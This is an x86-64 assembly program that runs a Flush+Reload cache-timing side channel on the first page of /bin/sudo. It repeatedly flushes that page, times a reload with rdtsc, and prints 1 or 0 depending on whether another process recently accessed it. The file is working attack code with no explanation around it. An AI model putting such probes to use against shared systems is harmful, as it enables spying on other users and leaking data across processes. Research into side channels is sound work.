.intel_syntax noprefix
.section .rodata

FILENAME:
	.string "/bin/sudo"

FORMAT:
	.string "%d\n"
	.word 0

.text
.global main
main:
	// Calling convention for userland
	//	%rdi, %rsi, %rdx, %rcx, %r8 and %r9
	
	// open FILENAME
	lea rdi, FILENAME[rip]
	mov rsi, 0
	xor rax, rax
	call open@plt

	// Save fd to the correct register
	mov r8d, eax

	// MMAP: mmap(NULL,DEFAULT_FILE_SIZE,PROT_READ,MAP_SHARED,fd,0);
	mov rdi, 0
	mov rsi, 4096
	mov rdx, 1
	mov rcx, 1
	// R8 Already moved (fd)
	mov r9, 0
	xor rax, rax
	call mmap@PLT
	push rax
	
	// Put mmap addr in rbx
	pop rbx
	xor rax, rax
	xor rdx, rdx
	mov rcx, 1000
	// flush+reload
	.hot_loop:
		// Do flush
		clflush [rbx]
		
		// do_nothing()*eax
		//	forces us to wait.
		//	Not great, but using usleep introduced noise
		mov eax, 50000000
		.wait_loop:
			dec eax
			jnz .wait_loop
		mfence
		lfence
		rdtsc
		lfence
		// save timestamp
		mov esi, eax
		// reload
		mov rax, [rbx]
		lfence
		rdtsc
		// Sub
		sub eax, esi
		cmp eax, 200
		jle .is_one
		mov eax, 0
		jmp .is_after
		.is_one:
		mov eax, 1
		.is_after:
		
		push rcx
		lea rdi, FORMAT[rip] 
		mov esi, eax
		xor eax, eax
		call printf
		pop rcx
		sub rcx, 1
		jnz .hot_loop
	ret
